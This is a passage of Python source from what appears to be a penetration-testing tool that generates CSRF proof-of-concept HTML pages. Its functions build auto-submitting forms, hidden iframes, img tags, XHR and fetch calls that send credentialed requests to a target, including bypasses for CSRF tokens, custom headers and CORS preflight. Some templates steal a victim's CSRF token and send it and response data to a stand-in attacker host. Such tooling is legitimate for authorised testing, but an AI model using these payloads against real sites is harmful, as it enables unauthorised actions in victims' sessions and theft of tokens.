                request_info, attacker_server, **kwargs)
        method, url, body = CSRFGenerator._apply_bypass(request_info, bypass)
        bypass_note = CSRFGenerator._bypass_note(bypass, request_info)

        body_str = ""
        if method in ("POST", "PUT", "PATCH") and body:
            escaped_body = body.replace('`', '\\`')
            body_str = f',\n    body: `{escaped_body}`'

        return f'''<!DOCTYPE html>
<html>
<head>
    <title>CSRF PoC - fetch API</title>
</head>
<body>
    <h3>CSRF Proof of Concept (fetch)</h3>
    {bypass_note}
    <p>Target: <code>{url}</code></p>
    <p>Attacker Server: <code>{attacker_server}</code></p>
    <p>This page sends a cross-origin request using fetch API.</p>

    <script>
        fetch("{url}", {{
            method: "{method}",
            credentials: "include",
            headers: {{
                "Content-Type": "application/x-www-form-urlencoded",
            }}{body_str}
        }})
        .then(response => {{
            var status = response.status;
            console.log("Status:", status);
            return response.text().then(data => ({{ status, data }}));
        }})
        .then(({{"status": status, "data": data}}) => {{
            console.log("Response:", data);
            if (status === 200 || status === 201 || status === 202) {{
                console.log("[!] Potential CSRF vulnerability detected!");
                fetch('{attacker_server}/log?data=' + encodeURIComponent(data), {{
                    mode: 'no-cors'
                }});
            }}
        }})
        .catch(error => {{
            console.error("Error:", error);
        }});
    </script>
</body>
</html>'''

    @staticmethod
    def generate_csrf_head_poc(request_info: RequestInfo,
                                auto_submit: bool = True,
                                new_tab: bool = False,
                                attacker_server: str = "https://attacker.com") -> str:
        """
        HEAD method bypass PoC.

        Many routers (Oak, Express router, etc.) route HEAD requests to the GET
        handler and strip the response body.  If a GET endpoint triggers a
        state-changing action or has looser validation than POST, sending HEAD
        instead bypasses those controls while the server still executes the action.
        HTML forms cannot send HEAD, so this PoC uses fetch().
        """
        ri  = request_info
        url = ri.url

        # Build header object for fetch (exclude hop-by-hop / browser-controlled headers)
        _skip = {"host", "content-length", "connection", "transfer-encoding"}
        # In mode:"no-cors", browsers only forward CORS-safelisted headers;
        # non-safelisted headers (e.g. Authorization, X-CSRF-Token) are silently dropped.
        _cors_simple = {"accept", "accept-language", "content-language", "content-type"}
        hdr_lines: List[str] = []
        dropped_hdrs: List[str] = []
        for k, v in ri.headers.items():
            if k.lower() in _skip:
                continue
            if k.lower() not in _cors_simple:
                dropped_hdrs.append(k)
                continue
            ek = k.replace("\\", "\\\\").replace('"', '\\"')
            ev = v.replace("\\", "\\\\").replace('"', '\\"')
            hdr_lines.append(f'            "{ek}": "{ev}"')
        headers_js = ",\n".join(hdr_lines)
        dropped_comment = (
            "\n        // \u26a0\ufe0f  These headers are silently dropped by the browser in"
            " mode:\"no-cors\" (non-safelisted):"
            f"\n        //   {', '.join(dropped_hdrs)}"
        ) if dropped_hdrs else ""

        # Auto-submit or manual button
        trigger = (
            "    window.onload = function() { sendHead(); };"
            if auto_submit else
            "    // Auto-submit disabled — click the button to trigger."
        )

        target_attr = 'target="_blank"' if new_tab else ''

        return f'''<!DOCTYPE html>
<html>
<head>
    <title>CSRF PoC – Token Bypass: HEAD Method</title>
</head>
<body>
    <p><strong>Bypass:</strong> HEAD method sent instead of GET/POST.</p>
    <p>
        Many server frameworks (Oak, Express, etc.) route <code>HEAD</code> requests
        to the same handler as <code>GET</code> and simply strip the response body.
        The server-side action still executes, but GET-specific rate limits or token
        validation may not apply.
    </p>
    <p>Target: <code>{url}</code></p>
    <p>Attacker server: <code>{attacker_server}</code></p>

    <button onclick="sendHead()">Send HEAD Request (CSRF)</button>
    <pre id="result" style="background:#1e1e1e;color:#ccc;padding:8px;margin-top:10px;">(waiting…)</pre>

    <script>
        function sendHead() {{
            fetch("{url}", {{
                method: "HEAD",
                mode: "no-cors",
                credentials: "include",
                headers: {{
{headers_js}
                }}
            }})
            .then(function() {{
                document.getElementById("result").textContent = "HEAD request sent (no-cors — check server logs for effect).";
            }})
            .catch(function(err) {{
                document.getElementById("result").textContent = "Error: " + err;
            }});
        }}
        {trigger}{dropped_comment}
        console.log("CSRF bypass PoC loaded – HEAD Method technique");
        console.log("Target:", "{url}");
    </script>
</body>
</html>'''

    @staticmethod
    def generate_csrf_custom_header_absent_poc(
            request_info: RequestInfo,
            csrf_header_name: str = "X-CSRF-Token",
            auto_submit: bool = True,
            new_tab: bool = False,
            attacker_server: str = "https://attacker.com") -> str:
        """
        Custom-header-token absent bypass PoC.

        Some applications protect CSRF solely via a custom header (e.g. X-CSRF-Token,
        X-XSRF-TOKEN).  HTML forms cannot set arbitrary headers — the browser blocks
        them. This PoC demonstrates that a cross-origin fetch() without that header
        still succeeds when the server does not enforce it, confirming the bypass.
        """
        ri   = request_info
        url  = ri.url
        method = ri.method or "POST"
        body = ri.body or ""

        # Build fetch body/headers — exclude the CSRF custom header and hop-by-hop
        _skip = {"host", "content-length", "connection", "transfer-encoding",
                 csrf_header_name.lower()}
        hdr_lines: list = []
        for k, v in ri.headers.items():
            if k.lower() in _skip:
                continue
            ek = k.replace("\\", "\\\\").replace('"', '\\"')
            ev = v.replace("\\", "\\\\").replace('"', '\\"')
            hdr_lines.append(f'                "{ek}": "{ev}"')
        headers_js = ",\n".join(hdr_lines)

        body_js = ""
        if method in ("POST", "PUT", "PATCH", "DELETE") and body:
            escaped = body.replace("`", "\\`")
            body_js = f",\n            body: `{escaped}`"

        trigger = (
            "    window.onload = function() { sendRequest(); };"
            if auto_submit else
            "    // Auto-submit disabled — click the button to trigger."
        )

        return f'''<!DOCTYPE html>
<html>
<head>
    <title>CSRF PoC \u2013 Custom Header Token: Header Absent</title>
</head>
<body>
    <p><strong>Bypass:</strong> Custom CSRF header (<code>{csrf_header_name}</code>) omitted.</p>
    <p>
        Cross-origin HTML forms <strong>cannot</strong> set custom headers \u2014 the browser
        blocks them per the CORS simple-request rules. If the server relies on
        <code>{csrf_header_name}</code> for CSRF protection but does not enforce it,
        a standard cross-origin request without the header will succeed.
    </p>
    <p>
        \u2139\ufe0f&nbsp; <strong>Tip:</strong> also test with an <em>incorrect</em> header value
        (change the value to a random string) to check whether the server validates
        the token content or only its presence.
    </p>
    <p>Target: <code>{url}</code></p>
    <p>Attacker server: <code>{attacker_server}</code></p>

    <button onclick="sendRequest()">Send Request (no {csrf_header_name})</button>
    <pre id="result" style="background:#1e1e1e;color:#ccc;padding:8px;margin-top:10px;">(waiting\u2026)</pre>

    <script>
        function sendRequest() {{
            fetch("{url}", {{
                method: "{method}",
                mode: "no-cors",
                credentials: "include",
                headers: {{
{headers_js}
                }}{body_js}
            }})
            .then(function() {{
                document.getElementById("result").textContent =
                    "Request sent without {csrf_header_name} (no-cors \u2014 check server logs for effect).";
            }})
            .catch(function(err) {{
                document.getElementById("result").textContent = "Error: " + err;
            }});
        }}
        {trigger}
        console.log("CSRF bypass PoC loaded \u2013 Custom Header Token: Header Absent");
        console.log("Omitted header: {csrf_header_name}");
        console.log("Target:", "{url}");
    </script>
</body>
</html>'''

    @staticmethod
    def generate_csrf_token_steal_poc(
            request_info: RequestInfo,
            get_url: str = "",
            token_selector: str = "",
            token_param: str = "",
            auto_submit: bool = True,
            new_tab: bool = False,
            attacker_server: str = "https://attacker.com") -> str:
        """
        Token-steal GET→POST PoC (requires CORS misconfiguration or same-origin context).

        Technique ('Steal CSRF Token and send a POST request'):
          1. Send a credentialed GET to get_url to fetch the page containing the CSRF token.
          2. Extract the token from the DOM (CSS selector / input name) or from a JSON response.
          3. Immediately POST to the action URL with all original body params + the stolen token.

        This works when:
          • The server reflects the CSRF token in a page the attacker can read cross-origin
            (CORS Access-Control-Allow-Origin: * or misconfigured wildcard), OR
          • The attacker has script execution on the same origin (XSS chain), OR
          • The token is predictable / tied to a global pool (not per-session).
        """
        ri       = request_info
        post_url = ri.url
        fetch_url = get_url.strip() or post_url   # where to GET the token page from
        method   = ri.method or "POST"
        body     = ri.body or ""

        # Auto-detect token param name from body if not supplied
        if not token_param:
            try:
                params = urllib.parse.parse_qsl(body, keep_blank_values=True)
                for k, _ in params:
                    if CSRFGenerator._is_csrf_token_key(k):
                        token_param = k
                        break
            except Exception:
                pass
            if not token_param:
                # Try JSON body
                try:
                    parsed_json = json.loads(body)
                    if isinstance(parsed_json, dict):
                        for k in parsed_json:
                            if CSRFGenerator._is_csrf_token_key(k):
                                token_param = k
                                break
                except Exception:
                    pass
            if not token_param:
                token_param = "csrf"   # sensible fallback

        # Auto-detect selector from token_selector or derive from token_param
        selector = token_selector.strip() if token_selector.strip() else f"input[name='{token_param}']"

        # Build non-token body params as JS object literal
        try:
            params = urllib.parse.parse_qsl(body, keep_blank_values=True)
            other_params = [(k, v) for k, v in params
                            if not CSRFGenerator._is_csrf_token_key(k)]
        except Exception:
            other_params = []

        body_entries = "\n".join(
            f"        {json.dumps(k)}: {json.dumps(v)},"
            for k, v in other_params
        )
        body_entries += f"\n        {json.dumps(token_param)}: token,"

        trigger = (
            "    window.onload = function() { stealAndSubmit(); };"
            if auto_submit else
            "    // Auto-submit disabled — click the button to trigger."
        )

        return f'''<!DOCTYPE html>
<html>
<head>
    <title>CSRF PoC \u2013 Token-Steal (GET \u2192 POST)</title>
</head>
<body>
    <h3>CSRF Token-Steal PoC</h3>
    <p>
        <strong>Step 1:</strong> Fetch <code>{fetch_url}</code> cross-origin with credentials.<br>
        <strong>Step 2:</strong> Extract CSRF token from <code>{selector}</code> (or JSON key
        <code>{token_param}</code>).<br>
        <strong>Step 3:</strong> POST to <code>{post_url}</code> with the stolen token.
    </p>
    <p style="background:#1a2a1a;color:#90ee90;border-left:4px solid #2ecc71;
              padding:8px 12px;font-size:0.85em;">
        \u2139\ufe0f This attack requires the server to expose the token cross-origin (CORS
        misconfiguration) or be used in an XSS chain. If the response is blocked by the
        browser&rsquo;s SOP, the XHR.response will be null and the token cannot be extracted.
    </p>
    <p>Attacker server: <code>{attacker_server}</code></p>

    <button onclick="stealAndSubmit()">Steal Token &amp; Submit</button>
    <pre id="result" style="background:#1e1e1e;color:#ccc;padding:8px;margin-top:10px;">(waiting\u2026)</pre>

    <script>
        var GET_URL  = {json.dumps(fetch_url)};
        var POST_URL = {json.dumps(post_url)};

        function stealAndSubmit() {{
            document.getElementById("result").textContent = "Fetching token from: " + GET_URL + " \u2026";

            var xhr = new XMLHttpRequest();
            xhr.responseType = "document";
            xhr.withCredentials = true;
            xhr.open("GET", GET_URL, true);

            xhr.onload = function() {{
                if (xhr.readyState !== XMLHttpRequest.DONE || xhr.status !== 200) {{
                    document.getElementById("result").textContent =
                        "GET failed \u2014 status: " + xhr.status + ". Check CORS headers.";
                    return;
                }}

                // ── Extract token: try DOM first, then JSON ──────────────
                var token = null;
                try {{
                    var page = xhr.response;
                    // Try CSS selector
                    var el = page.querySelector({json.dumps(selector)});
                    if (el) {{
                        token = el.value !== undefined ? el.value : el.textContent;
                    }}
                    // Fallback: try plain input[name] lookup
                    if (!token && page.forms && page.forms[0]) {{
                        var inp = page.forms[0].elements[{json.dumps(token_param)}];
                        if (inp) token = inp.value;
                    }}
                }} catch(e) {{}}

                // Try JSON body
                if (!token) {{
                    try {{
                        var obj = JSON.parse(xhr.responseText);
                        token = obj[{json.dumps(token_param)}] || obj["token"] || obj["csrf"] || null;
                    }} catch(e) {{}}
                }}

                if (!token) {{
                    document.getElementById("result").textContent =
                        "Could not extract token. Selector: {selector}\\n"
                        + "Response may be blocked by SOP or selector does not match.";
                    return;
                }}

                document.getElementById("result").textContent = "Token stolen: " + token + "\\nSending POST\u2026";

                // ── POST with stolen token ──────────────────────────────
                var bodyObj = {{
{body_entries}
                }};

                var encoded = Object.keys(bodyObj)
                    .map(function(k) {{
                        return encodeURIComponent(k) + "=" + encodeURIComponent(bodyObj[k]);
                    }}).join("&");

                var xhr2 = new XMLHttpRequest();
                xhr2.withCredentials = true;
                xhr2.open("{method}", POST_URL, true);
                xhr2.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
                xhr2.onreadystatechange = function() {{
                    if (xhr2.readyState === XMLHttpRequest.DONE) {{
                        document.getElementById("result").textContent =
                            "POST sent.\\nStatus: " + xhr2.status + "\\n\\nResponse (first 500 chars):\\n"
                            + xhr2.responseText.slice(0, 500);
                        // Exfil response to attacker server
                        try {{
                            fetch({json.dumps(attacker_server)} + "/log?status=" + xhr2.status
                                  + "&token=" + encodeURIComponent(token)
                                  + "&resp=" + encodeURIComponent(xhr2.responseText.slice(0, 200)),
                                  {{mode: "no-cors"}});
                        }} catch(e) {{}}
                    }}
                }};
                xhr2.send(encoded);
            }};

            xhr.onerror = function() {{
                document.getElementById("result").textContent =
                    "Network error on GET. This is expected if SOP blocks the read.\\n"
                    + "The attack requires CORS misconfiguration or XSS context.";
            }};

            xhr.send(null);
        }}

        {trigger}
        console.log("CSRF Token-Steal PoC loaded");
        console.log("GET URL (token source):", GET_URL);
        console.log("POST URL (action):", POST_URL);
        console.log("Token selector:", {json.dumps(selector)});
        console.log("Token param:", {json.dumps(token_param)});
    </script>
</body>
</html>'''

    @staticmethod
    def generate_csrf_plain_json_poc(request_info: RequestInfo,
                                      auto_submit: bool = True,
                                      new_tab: bool = False,
                                      attacker_server: str = "https://attacker.com") -> str:
        """
        Preflight bypass PoC for JSON APIs.

        Sends the original JSON body with Content-Type: text/plain via fetch()
        and mode:'no-cors'.  Because text/plain is a CORS "simple" content type,
        the browser never sends an OPTIONS preflight — the real POST goes straight
        through with the victim's session cookies attached.

        Vulnerable targets: any server that calls json.loads(body) / JSON.parse(body)
        without first validating that Content-Type is application/json (extremely
        common in Express, Flask, FastAPI, Go encoding/json, Spring, etc.).
        """
        ri   = request_info
        url  = ri.url
        body = ri.body or "{}"

        # Build the JS payload setup block.
        # Try JSON first; if that fails, try URL-encoded and convert to a JSON object
        # so the server always receives a proper JSON body (the whole point of this technique).
        try:
            parsed   = json.loads(body)
            if not isinstance(parsed, dict):
                raise ValueError("not a dict")
            js_obj   = json.dumps(parsed, indent=2)
            js_setup = (
                f"var payloadData = {js_obj};\n"
                f"        var jsonBody = JSON.stringify(payloadData);"
            )
        except (json.JSONDecodeError, ValueError):
            # Try URL-encoded → convert to JSON dict
            try:
                pairs = urllib.parse.parse_qsl(body, keep_blank_values=True)
                if pairs:
                    parsed  = dict(pairs)
                    js_obj  = json.dumps(parsed, indent=2)
                    js_setup = (
                        f"var payloadData = {js_obj};\n"
                        f"        var jsonBody = JSON.stringify(payloadData);"
                    )
                else:
                    raise ValueError("empty")
            except Exception:
                # Truly unparseable — send as raw string (last resort)
                js_str   = json.dumps(body)
                js_setup = f"var jsonBody = {js_str};"

        trigger = (
            "    window.onload = function() { sendRequest(); };"
            if auto_submit else
            "    // Auto-submit disabled — click the button to trigger."
        )

        return f'''<!DOCTYPE html>
<html>
<head>
    <title>CSRF PoC – Preflight Bypass: text/plain + JSON body</title>
</head>
<body>
    <h3>CSRF PoC — Preflight Bypass: <code>text/plain</code> + JSON body</h3>
    <p>
        <strong>Technique:</strong> The original JSON body is sent with
        <code>Content-Type: text/plain</code> via <code>fetch()</code> and
        <code>mode: "no-cors"</code>.<br>
        Because <code>text/plain</code> is a browser <em>simple</em> content type,
        <strong>no CORS preflight (OPTIONS request) is sent</strong> — the real POST
        goes straight to the server with the victim\'s session cookies included.<br>
        If the server parses the body as JSON regardless of the Content-Type header
        (common in Express, Flask/FastAPI, Go <code>encoding/json</code>, Spring, etc.),
        the action executes cross-origin without any CORS approval.
    </p>
    <p>Target: <code>{url}</code></p>
    <p>Attacker server: <code>{attacker_server}</code></p>

    <button onclick="sendRequest()">Send Request (CSRF)</button>
    <pre id="result" style="background:#1e1e1e;color:#ccc;padding:8px;margin-top:10px;">(waiting…)</pre>

    <script>
        {js_setup}

        function sendRequest() {{
            fetch("{url}", {{
                method: "{ri.method}",
                mode: "no-cors",
                credentials: "include",
                headers: {{
                    "Content-Type": "text/plain"
                }},
                body: jsonBody
            }})
            .then(function() {{
                document.getElementById("result").textContent =
                    "Request sent (no-cors \u2014 response opaque). Check server logs for effect.";
            }})
            .catch(function(err) {{
                document.getElementById("result").textContent = "Error: " + err;
            }});
        }}
        {trigger}
        console.log("CSRF bypass PoC loaded \u2013 Preflight Bypass (text/plain + JSON body)");
        console.log("Target:", "{url}");
        console.log("Method:", "{ri.method}");
        console.log("JSON body:", jsonBody);
    </script>
</body>
</html>'''

    @staticmethod
    def generate_csrf_form_json_poc(request_info: RequestInfo,
                                     auto_submit: bool = True,
                                     new_tab: bool = False,
                                     attacker_server: str = "https://attacker.com") -> str:
        """
        JSON-via-form-trick PoC (no JavaScript required).

        Uses enctype="text/plain" on a plain HTML form.  The browser concatenates
        name + "=" + value for every input, so the JSON object is split so that
        the mandatory "=" lands *inside* a harmless extra string value:

            name  = '{"email":"victim@x.com","_":"'
            value = '"}'
            sent  = {"email":"victim@x.com","_":"="}   ← valid JSON

        Because text/plain is a CORS simple content type no OPTIONS preflight is
        triggered.  Works even when JavaScript is blocked by CSP.
        """
        ri  = request_info
        url = ri.url

        # Parse the JSON body into fields; fall back to URL-encoded parsing so that
        # a standard form body (email=foo&csrf=bar) is also handled correctly instead
        # of being dumped as a single input name (which produces a spurious trailing =).
        try:
            parsed = json.loads(ri.body or "{}")
            if not isinstance(parsed, dict):
                parsed = {}
        except (json.JSONDecodeError, ValueError):
            # Not JSON — try URL-encoded (e.g. "email=foo&csrf=bar")
            try:
                pairs = urllib.parse.parse_qsl(ri.body or "", keep_blank_values=True)
                parsed = dict(pairs) if pairs else {}
            except Exception:
                parsed = {}

        if parsed:
            # Build the JSON prefix that goes in the `name` attribute, then the
            # closing piece in `value`.  The = separator between them completes
            # the JSON as the extra "_" key's value.
            #
            # Strategy: serialise all keys except the last into the name prefix,
            # then use the last key as the final field, hiding = in its value.
            #
            # For a single-field JSON like {"email":"a@b.com"} this produces:
            #   name  = '{"email":"a@b.com","_":"'
            #   value = '"}'
            #   sent  = {"email":"a@b.com","_":"="}
            #
            # For multi-field JSON like {"u":"x","p":"y"} this produces:
            #   name  = '{"u":"x","p":"y","_":"'
            #   value = '"}'
            #   sent  = {"u":"x","p":"y","_":"="}

            # Build JSON without the trailing }
            inner = json.dumps(parsed)[:-1]   # e.g. '{"email":"a@b.com"'
            # Escape HTML attribute special chars
            def _attr(s: str) -> str:
                return s.replace("&", "&amp;").replace('"', "&quot;")

            input_name  = _attr(inner + ',"_":"')
            input_value = _attr('"}')
            inputs_html = (
                f'        <input type="hidden" name="{input_name}" value="{input_value}">\n'
                f'        <!-- body sent: {inner},"_":"="}} -->\n'
                f'        <!-- parser sees: all original fields + harmless extra "_":"=" -->'
            )
        else:
            # Fallback: body couldn't be parsed as JSON or URL-encoded (e.g. raw binary).
            # Wrap it in a minimal JSON object so the form trick still produces valid JSON.
            raw_escaped = json.dumps(ri.body or "")          # Python str → JS/JSON string literal
            inner       = '{' + f'"data":{raw_escaped},"_":"'
            def _attr(s: str) -> str:
                return s.replace("&", "&amp;").replace('"', "&quot;")
            input_name  = _attr(inner)
            input_value = _attr('"}')
            inputs_html = (
                f'        <input type="hidden" name="{input_name}" value="{input_value}">\n'
                f'        <!-- body sent: {_attr(inner)}="}} (raw body wrapped in JSON) -->'
            )

        target_attr = ' target="_blank"' if new_tab else ""
        auto_js = (
            "\n    <script>document.getElementById('csrf_form').submit();</script>"
            if auto_submit else ""
        )
        _form_method = ri.method if ri.method.upper() in ("GET", "POST") else "POST"
        _method_note = (
            f'<p><strong>\u26a0\ufe0f Note:</strong> Original request used '
            f'<code>{ri.method}</code>. HTML forms only support '
            '<code>GET</code>/<code>POST</code> \u2014 submitting as <code>POST</code>. '
            'For <code>PUT</code>/<code>PATCH</code> targets use the '
            '<em>XHR</em> output format instead.</p>'
        ) if ri.method.upper() not in ("GET", "POST") else ""

        return f'''<!DOCTYPE html>
<html>
<head>
    <title>CSRF PoC \u2013 JSON via Form Trick (no JS)</title>
</head>
<body>
    <h3>CSRF PoC \u2014 JSON via Form Trick (<code>enctype="text/plain"</code>, no JavaScript)</h3>
    <p>
        <strong>Technique:</strong> The JSON body is split across the
        <code>name</code> and <code>value</code> attributes of a hidden input
        so the browser\u2019s mandatory <code>=</code> separator lands <em>inside</em>
        a harmless extra JSON key (<code>"_":"="</code>).<br>
        Result: <code>{{"email":"...","_":"="}}</code> \u2014 <strong>valid JSON</strong>, sent with
        <code>Content-Type: text/plain</code> (a CORS <em>simple</em> type \u2014
        <strong>no preflight triggered</strong>).<br>
        <strong>No JavaScript needed</strong> \u2014 works even under a strict
        <code>Content-Security-Policy: script-src \u2018none\u2019</code>.
    </p>
    <p>Target: <code>{url}</code></p>
    <p>Attacker server: <code>{attacker_server}</code></p>

    {_method_note}
    <form id="csrf_form"
          action="{url}"
          method="{_form_method}"
          enctype="text/plain"{target_attr}>
{inputs_html}
        <input type="submit" value="Submit (JSON via form trick)">
    </form>
    {auto_js}
</body>
</html>'''

    # ── helpers shared across generators ──────────────────────────────────────

    @staticmethod
    def _apply_bypass(request_info: RequestInfo, bypass: str) -> Tuple[str, str, str]:
        """Return (effective_method, effective_url, body) after applying bypass."""
        method = request_info.method
        url    = request_info.url
        body   = request_info.body

        if bypass == CSRFGenerator.BYPASS_REQUEST_METHOD and method == "POST":
            url    = CSRFGenerator._body_to_query_params(url, body)
            method = "GET"
            body   = ""

        elif bypass == CSRFGenerator.BYPASS_HEAD_METHOD:
            # Keep body/URL as-is; the PoC generator will use fetch with method HEAD
            method = "HEAD"

        elif bypass == CSRFGenerator.BYPASS_TOKEN_ABSENT and body:
            # Try JSON first, then URL-encoded
            try:
                data = json.loads(body)
                if isinstance(data, dict):
                    cleaned = CSRFGenerator._strip_csrf_token_json(data)
                    body = json.dumps(cleaned)
            except (json.JSONDecodeError, ValueError):
                body = CSRFGenerator._strip_csrf_token(body)

        elif bypass == CSRFGenerator.BYPASS_TOKEN_EMPTY and body:
            # Set CSRF token to empty string (server may not validate the value)
            try:
                data = json.loads(body)
                if isinstance(data, dict):
                    cleaned = CSRFGenerator._empty_csrf_token_json(data)
                    body = json.dumps(cleaned)
            except (json.JSONDecodeError, ValueError):
                body = CSRFGenerator._empty_csrf_token(body)

        elif bypass in CSRFGenerator._METHOD_OVERRIDES and body is not None:
            # Keep method as POST; append _method override to the body so the
            # hidden form inputs will include it automatically.
            if bypass == CSRFGenerator.BYPASS_METHOD_OVERRIDE_DELETE:
                _override = "DELETE"
            elif bypass == CSRFGenerator.BYPASS_METHOD_OVERRIDE_PUT:
                _override = "PUT"
            else:
                _override = "PATCH"
            try:
                existing = urllib.parse.parse_qsl(body, keep_blank_values=True)
                existing.append(("_method", _override))
                body = urllib.parse.urlencode(existing)
            except Exception:
                body = (body + "&" if body else "") + f"_method={_override}"

        # BYPASS_CONTENT_TYPE, BYPASS_REFERER_ABSENT, and BYPASS_CUSTOM_HEADER_ABSENT
        # are intentionally not handled here — they do not modify the HTTP method,
        # URL, or body.  The behaviour change is applied at the HTML rendering level.
        return method, url, body

    @staticmethod
    def _hidden_inputs_from_body(body: str) -> str:
        """Parse a POST body and return hidden <input> tags."""
        hidden = ""
        if not body:
            return hidden
        try:
            data = json.loads(body)
            if isinstance(data, dict):
                for k, v in data.items():
                    sv = json.dumps(v, separators=(',', ':')) if isinstance(v, (dict, list)) else str(v)
                    ev = sv.replace('"', '&quot;').replace('<', '&lt;').replace('>', '&gt;')
                    hidden += f'        <input type="hidden" name="{k}" value="{ev}">\n'
            return hidden
        except (json.JSONDecodeError, ValueError):
            pass
        try:
            for k, vs in urllib.parse.parse_qs(body, keep_blank_values=True).items():
                ev = (vs[0] if vs else "").replace('"', '&quot;').replace('<', '&lt;').replace('>', '&gt;')
                hidden += f'        <input type="hidden" name="{k}" value="{ev}">\n'
        except Exception:
            hidden = f'        <textarea name="data" style="display:none">{body}</textarea>\n'
        return hidden or '        <input type="hidden" name="data" value="csrf_test">\n'

    # ── iFrame ────────────────────────────────────────────────────────────────

    @staticmethod
    def generate_csrf_iframe_poc(request_info: RequestInfo,
                                  attacker_server: str = "https://attacker.com",
                                  bypass: str = "None",
                                  auto_submit: bool = False, **kwargs) -> str:
        """CSRF PoC delivered via an auto-submitting hidden iframe form."""
        if bypass == CSRFGenerator.BYPASS_NOT_TIED_TO_SESSION:
            return CSRFGenerator.generate_csrf_not_tied_to_session_poc(
                request_info, attacker_server, auto_submit=auto_submit, **kwargs)
        method, url, body = CSRFGenerator._apply_bypass(request_info, bypass)
        bypass_note = CSRFGenerator._bypass_note(bypass, request_info)

        if method == "GET":
            # GET: iframe src fires automatically — auto_submit has no extra effect
            # but we note it for consistency
            auto_note = "" if not auto_submit else \
                "<!-- auto-submit: iframe src fires on load automatically -->"
            return f'''<!DOCTYPE html>
<html>
<head><title>CSRF PoC – iFrame (GET)</title></head>
<body>
    <h3>CSRF Proof of Concept – iFrame</h3>
    <p>Target: <code>{url}</code></p>
    {bypass_note}
    <p>The hidden iframe loads the target URL automatically, triggering the GET request.</p>
    {auto_note}
    <iframe src="{url}" style="display:none"></iframe>

    <script>console.log("CSRF iFrame PoC loaded (GET):", "{url}");</script>
</body>
</html>'''

        # POST: embed a hidden form inside the iframe using srcdoc
        hidden_inputs = CSRFGenerator._hidden_inputs_from_body(body)
        srcdoc = (
            f'<form action="{url}" method="POST" id="f">'
            f'{hidden_inputs.strip()}'
            f'</form>'
            '<script>document.getElementById("f").submit();<' + '/script>'
        ).replace("'", "&#39;")

        # For POST iframes the inner form always auto-submits (that's the technique).
        # The outer auto_submit checkbox controls whether the *page* triggers it on load
        # — for iframes the page-level load is immediate, so it's always "auto".
        return f'''<!DOCTYPE html>
<html>
<head><title>CSRF PoC – iFrame (POST)</title></head>
<body>
    <h3>CSRF Proof of Concept – iFrame</h3>
    <p>Target: <code>{url}</code></p>
    {bypass_note}
    <p>A hidden iframe contains an auto-submitting form that POSTs to the target.</p>

    <iframe srcdoc='{srcdoc}' style="display:none"></iframe>

    <script>console.log("CSRF iFrame PoC loaded (POST):", "{url}");</script>
</body>
</html>'''

    # ── IMG ───────────────────────────────────────────────────────────────────

    @staticmethod
    def generate_csrf_img_poc(request_info: RequestInfo,
                               attacker_server: str = "https://attacker.com",
                               bypass: str = "None",
                               auto_submit: bool = False, **kwargs) -> str:
        """CSRF PoC via <img src="..."> — works for GET requests only."""
        if bypass == CSRFGenerator.BYPASS_NOT_TIED_TO_SESSION:
            return CSRFGenerator.generate_csrf_not_tied_to_session_poc(
                request_info, attacker_server, auto_submit=auto_submit, **kwargs)
        method, url, body = CSRFGenerator._apply_bypass(request_info, bypass)
        original_method = request_info.method
        bypass_note = CSRFGenerator._bypass_note(bypass, request_info)

        if method == "GET":
            # IMG always fires on load — auto_submit is implicit
            return f'''<!DOCTYPE html>
<html>
<head><title>CSRF PoC – IMG tag</title></head>
<body>
    <h3>CSRF Proof of Concept – IMG tag</h3>
    <p>Target: <code>{url}</code></p>
    {bypass_note}
    <p>
        The browser automatically requests the <code>src</code> URL when the page
        loads, sending the victim's cookies.  This technique works for GET requests;
        the response content is not accessible due to the same-origin policy.
    </p>

    <img src="{url}" style="display:none"
         onerror="console.log('IMG CSRF triggered (load error is normal)');"
         onload="console.log('IMG CSRF triggered (200 response)');">

    <script>console.log("CSRF IMG PoC loaded – target:", "{url}");</script>
</body>
</html>'''

        # POST without method bypass — warn and fall back to a form
        auto_submit_script = (
            '\n    <script>\n        document.getElementById("csrf_form").submit();\n    </script>'
            if auto_submit else ""
        )
        return f'''<!DOCTYPE html>
<html>
<head><title>CSRF PoC – IMG tag (POST – limited)</title></head>
<body>
    <h3>CSRF Proof of Concept – IMG tag</h3>
    <p>Target: <code>{request_info.url}</code></p>
    {bypass_note}
    <p style="color:orange;">
        ⚠️  The IMG technique only works with GET requests.
        The original request uses <strong>{original_method}</strong>.<br>
        Select the <em>"Token validation – Request method"</em> bypass to switch
        POST → GET, or choose a different output format.
    </p>

    <!-- Fallback hidden form so testers can still trigger the request -->
    <form action="{request_info.url}" method="POST" id="csrf_form" style="display:none">
{CSRFGenerator._hidden_inputs_from_body(body)}    </form>{auto_submit_script}
</body>
</html>'''

    # ── XHR ───────────────────────────────────────────────────────────────────

    @staticmethod
    def generate_csrf_xhr_poc(request_info: RequestInfo,
                               attacker_server: str = "https://attacker.com",
                               bypass: str = "None",
                               auto_submit: bool = False, **kwargs) -> str:
        """CSRF PoC via XMLHttpRequest."""
        if bypass == CSRFGenerator.BYPASS_NOT_TIED_TO_SESSION:
            return CSRFGenerator.generate_csrf_not_tied_to_session_poc(
                request_info, attacker_server, auto_submit=auto_submit, **kwargs)
        method, url, body = CSRFGenerator._apply_bypass(request_info, bypass)
        bypass_note = CSRFGenerator._bypass_note(bypass, request_info)

        # Detect original Content-Type (case-insensitive) so the XHR matches the real request.
        _orig_ct = next(
            (v for k, v in request_info.headers.items() if k.lower() == "content-type"),
            "application/x-www-form-urlencoded",
        )
        _orig_ct = _orig_ct.split(";")[0].strip() or "application/x-www-form-urlencoded"

        if method == "GET":
            send_block = "xhr.send();"
        else:
            escaped = body.replace("'", "\\'").replace("\n", "\\n")
            send_block = f"xhr.send('{escaped}');"

        # XHR runs immediately in <script> — auto_submit adds a note only
        auto_note = "// auto-submit: XHR fires on page load automatically" if auto_submit else ""

        return f'''<!DOCTYPE html>
<html>
<head><title>CSRF PoC – XHR</title></head>
<body>
    <h3>CSRF Proof of Concept – XMLHttpRequest</h3>
    <p>Target: <code>{url}</code></p>
    {bypass_note}
    <p>
        The XHR is sent with the victim's cookies (<code>withCredentials: true</code>).
        <strong>Note:</strong> this is subject to the Same-Origin Policy — the response
        body is only readable if the server returns permissive CORS headers.
    </p>

    <script>
        {auto_note}
        var xhr = new XMLHttpRequest();
        xhr.open("{method}", "{url}", true);
        xhr.withCredentials = true;
        xhr.setRequestHeader("Content-Type", "{_orig_ct}");

        xhr.onreadystatechange = function() {{
            if (xhr.readyState === XMLHttpRequest.DONE) {{
